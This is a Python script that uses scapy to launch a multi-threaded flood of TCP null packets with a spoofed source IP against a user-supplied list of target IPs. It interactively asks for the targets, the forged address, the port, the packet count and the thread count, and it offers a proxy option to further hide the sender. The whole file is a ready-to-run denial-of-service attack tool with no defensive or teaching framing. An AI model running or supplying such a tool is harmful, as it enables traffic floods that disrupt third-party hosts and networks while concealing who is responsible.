from scapy.all import *
import random
import threading
import os

def send_null_packet(target_ip, spoofed_ip, port):
    """Sends a single spoofed null packet to the target."""
    ip = IP(src=spoofed_ip, dst=target_ip)
    tcp = TCP(sport=random.randint(1024, 65535), dport=port, flags="", seq=random.randint(0, 4294967295))
    send(ip / tcp, verbose=False)

def load_target_ips(file_path):
    """Loads target IPs from a given text file."""
    try:
        with open(file_path, 'r') as file:
            ips = [line.strip() for line in file if line.strip()]
            if not ips:
                raise ValueError("The target IP list is empty.")
            return ips
    except FileNotFoundError:
        print(f"Error: File '{file_path}' not found.")
        exit(1)
    except ValueError as e:
        print(f"Error: {e}")
        exit(1)

def threaded_packet_flood(target_ips, spoofed_ip, port, packet_count, threads):
    """
    Launches a multi-threaded packet flood with spoofed null packets.
    """
    print(f"Starting threaded flood: {packet_count} packets to {len(target_ips)} target IPs on port {port} with {threads} threads...")

    def worker():
        """Thread worker to send packets."""
        packets_per_thread = packet_count // threads
        for _ in range(packets_per_thread):
            for target_ip in target_ips:
                send_null_packet(target_ip, spoofed_ip, port)

    # Create and start threads
    thread_list = []
    for _ in range(threads):
        thread = threading.Thread(target=worker)
        thread_list.append(thread)
        thread.start()

    # Wait for all threads to finish
    for thread in thread_list:
        thread.join()

    print("Packet flood complete.")

def use_proxies():
    """Check if proxies should be used and handle accordingly."""
    proxy_choice = input("Do you want to use proxies? (y/n): ").strip().lower()
    if proxy_choice == 'y':
        # Placeholder for proxy setup
        print("Using proxies... (implement proxy logic here if needed)")
        # Note: Implement the proxy logic according to your requirements
        # For example, use `proxychains` if you have it set up in your environment
    else:
        print("No proxies will be used.")

# User inputs for target IPs, spoofed IP, port, packet count, and thread count
if __name__ == "__main__":
    target_file = input("Enter path to the target IP list (txt): ")
    spoofed_ip = input("Enter spoofed IP: ")
    port = int(input("Enter target port: "))
    packet_count = int(input("Enter total number of packets: "))
    threads = int(input("Enter number of threads: "))

    # Load target IPs from the provided text file
    target_ips = load_target_ips(target_file)

    # Ask user if they want to use proxies
    use_proxies()

    # Start the packet flood with the loaded target IPs
    threaded_packet_flood(target_ips, spoofed_ip, port, packet_count, threads)
